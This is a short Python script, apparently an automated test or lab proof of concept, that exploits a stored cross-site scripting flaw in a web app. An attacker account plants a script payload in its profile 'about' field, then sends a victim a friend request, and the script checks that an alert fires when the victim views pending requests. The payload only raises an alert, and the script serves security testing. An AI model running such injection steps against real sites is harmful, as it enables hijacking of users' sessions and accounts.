from requests import session, get
from sys import argv
from random import randint
from Common.Driver import runAlert, getScript

SERVER = argv[1]

victimSession = session()
victimUsername = str(randint(2 ** 27, 2 ** 28))
victimPassword = str(randint(2 ** 27, 2 ** 28))
attackerSession = session()
attackerUsername = str(randint(2 ** 27, 2 ** 28))
attackerPassword = str(randint(2 ** 27, 2 ** 28))
alrText = "Exploited" + str(randint(2 ** 27, 2 ** 28))
scrPath = "Common/Scripts/XSS/DisplaysAlert.html"

# Cleaning DB
r = get(SERVER + "/init")
assert "Initialisation DONE!" in r.text

# Attacker Registration
data = {
    "username": attackerUsername,
    "password": attackerPassword
}
r = attackerSession.post(SERVER + "/register", data=data)

assert "Welcome" in r.text
assert attackerUsername in r.text

# Attacker About Update
sArgs = {
    "alert": alrText
}
data = {
    "name": "",
    "currentpassword": attackerPassword,
    "newpassword": "",
    "about": getScript(scrPath, sArgs=sArgs)
}
files = {
    "photo": ""
}
r = attackerSession.post(SERVER + "/update_profile", data=data, files=files)
assert "Succesfully" in r.text
assert attackerUsername in r.text

# Victim Registration
data = {
    "username": victimUsername,
    "password": victimPassword
}
r = victimSession.post(SERVER + "/register", data=data)

assert "Welcome" in r.text
assert victimUsername in r.text

# Attacker sends a Friend Requests to the Victim
data = {
    "username": victimUsername
}
r = attackerSession.post(SERVER + "/request_friend", data=data)

assert "Succesfully" in r.text
assert victimUsername in r.text

# Victim Checks Friend Requests
# Asserting Alert
runAlert(SERVER, SERVER + "/pending_requests", victimSession, alrText)

print("Success!")
victimSession.close()
attackerSession.close()
